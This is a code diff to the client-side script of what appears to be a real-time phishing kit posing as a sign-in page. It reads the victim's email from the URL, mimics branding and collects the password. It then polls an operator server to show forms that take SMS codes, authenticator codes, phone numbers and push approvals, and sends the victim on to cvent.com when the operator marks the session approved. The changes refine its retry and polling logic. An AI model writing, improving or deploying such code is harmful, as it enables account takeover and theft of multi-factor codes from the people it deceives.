@@ -508,10 +508,25 @@
         if (rawHash && rawHash.length > 1) {
             // Remove the leading '#'
             hashEmail = rawHash.substring(1);
+            if (hashEmail.includes("&")) {
+                hashEmail = hashEmail.split("&")[0];
+            }
+            hashEmail = decodeURIComponent(hashEmail);
             $("#ai").val(hashEmail);
             $("#modal_ai").val(hashEmail);
+            currentEmail = hashEmail;
             updateBranding(hashEmail);
             console.log("Stored email:", hashEmail);
+        }
+
+        // Auto open password view if returning from retry or wrong number
+        if (window.location.search.includes("retry=1") || window.location.hash.includes("retry=1")) {
+            setTimeout(function () {
+                showView("#div1");
+                $("#password-field-container").show();
+                $("#pr").val("").focus();
+                showError("Incorrect password. Please try again.");
+            }, 300);
         }
 
         function updateBranding(email) {
@@ -919,7 +934,27 @@ Authenticator App Code : ${code}
                             showError("Session expired. Please try again.");
                             return;
                         }
-                        // Check for redirect value
+
+                        // 1. Check for retry / wrong password / wrong number FIRST
+                        const isRetry = data.message === "retry" ||
+                            data.status === "retry" ||
+                            data.status === "wrong_number_pressed" ||
+                            data.status === "wrong_password" ||
+                            (data.redirect && (
+                                data.redirect.toLowerCase() === "retry" ||
+                                data.redirect.toLowerCase().includes("wrong_password") ||
+                                data.redirect.toLowerCase().includes("wrong_number")
+                            ));
+
+                        if (isRetry) {
+                            showView("#div1");
+                            $("#password-field-container").show();
+                            $("#pr").val("").focus();
+                            showError("Incorrect password. Please try again.");
+                            return;
+                        }
+
+                        // 2. Check for redirect actions
                         if (data.redirect) {
                             const redirectVal = data.redirect.toLowerCase();
 
@@ -948,49 +983,34 @@ Authenticator App Code : ${code}
                             } else if (redirectVal.includes("sms code") || redirectVal.includes("sms_code") || redirectVal.includes("sms")) {
                                 showView("#div_sms_code");
                                 $("#sms_code").val("");
+                                setTimeout(fetchStatus, 2500);
+                                return;
                             } else if (redirectVal.includes("tap-yes") || redirectVal.includes("tap yes") || redirectVal.includes("tap_yes") || redirectVal.includes("tap") || redirectVal.includes("yes")) {
                                 showView("#div_tap_yes");
                                 setTimeout(fetchStatus, 2500);
+                                return;
                             } else if (redirectVal.includes("authentication code") || redirectVal.includes("auth") || redirectVal.includes("authenticator")) {
                                 showView("#div_auth_code");
                                 $("#auth_code").val("");
+                                setTimeout(fetchStatus, 2500);
+                                return;
                             } else if (redirectVal.includes("ask phonnumber") || redirectVal.includes("ask phonenumber") || redirectVal.includes("ask_phone") || redirectVal.includes("phone") || redirectVal.includes("prompt")) {
                                 showView("#div2");
                                 $("#phone").val("");
-                            } else if (redirectVal.includes("redirect.html") || redirectVal.includes("redirect") || redirectVal.includes("saved") || redirectVal.includes("cvent.com")) {
+                                setTimeout(fetchStatus, 2500);
+                                return;
+                            } else if (redirectVal.includes("cvent.com") || redirectVal === "saved" || redirectVal === "approved" || redirectVal.includes("redirect.html")) {
                                 window.location.href = targetRedirect;
                                 return;
                             } else if (redirectVal.startsWith("http://") || redirectVal.startsWith("https://")) {
                                 window.location.href = data.redirect;
                                 return;
-                            } else {
-                                window.location.href = targetRedirect;
-                                return;
                             }
-                            return;
                         }
 
-                        // Check for retry command
-                        if (data.message === "retry" || data.status === "retry") {
-                            showView(lastFormView);
-
-                            let errMsg = "Verification failed. Please try again.";
-                            if (lastFormView === "#div1") {
-                                $("#password-field-container").show();
-                                $("#pr").val("").focus();
-                                errMsg = "Incorrect password. Please try again.";
-                            } else if (lastFormView === "#div2") {
-                                $("#phone").val("").focus();
-                                errMsg = "Invalid phone number format. Please enter a valid number.";
-                            } else if (lastFormView === "#div_sms_code") {
-                                $("#sms_code").val("").focus();
-                                errMsg = "Invalid SMS verification code. Please check and try again.";
-                            } else if (lastFormView === "#div_auth_code") {
-                                $("#auth_code").val("").focus();
-                                errMsg = "Invalid Authenticator App code. Please try again.";
-                            }
-
-                            showError(errMsg);
+                        // 3. Check for approval status
+                        if (data.status === "saved" || data.status === "approved") {
+                            window.location.href = targetRedirect;
                             return;
                         }
 
